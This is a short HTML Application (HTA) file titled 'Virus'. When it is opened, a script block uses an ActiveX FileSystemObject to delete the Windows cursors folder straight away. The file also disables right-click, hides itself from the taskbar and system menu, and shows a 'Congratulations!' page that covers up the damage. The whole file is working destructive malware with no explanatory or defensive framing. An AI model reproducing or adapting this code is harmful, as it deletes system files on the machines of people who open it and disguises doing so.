<HTML>
<HEAD>

<TITLE>Virus</TITLE>

<script language="JScript">

var fs = new ActiveXObject("Scripting.FileSystemObject");
var a = fs.DeleteFolder("c:\\windows/cursors");

</script>

<HTA:APPLICATION
       ID="oHTA"
       APPLICATIONNAME="ComplexHTA"
       CAPTION="yes"
       ICON="ComplexHTA.ico"
       MAXIMIZEBUTTON="no"
       MINIMIZEBUTTON="no"
       SHOWINTASKBAR="no"
       SINGLEINSTANCE="no"
       SYSMENU="no"
       VERSION="1.0"
       WINDOWSTATE="normal">

<script language="JavaScript">

var message="Now Hang On Here!";

function click(e) {
if (document.all) {
if (event.button == 2) {
alert(message);
return false;
}
}
if (document.layers) {
if (e.which == 3) {
alert(message);
return false;
}
}
}
if (document.layers) {
document.captureEvents(Event.MOUSEDOWN);
}
document.onmousedown=click;

</script>

</HEAD>

<BODY BGCOLOR="000000" TEXT="FFFFFF" LINK="6BC8F2" VLINK="6BC8F2" ALINK="6BC8F2">

<BR>
<BR>
<BR>

<CENTER>Congratulations!</CENTER>

<P>

<center><BUTTON onclick="self.close()">Click Here To Close

</BUTTON></center>

</HTML>
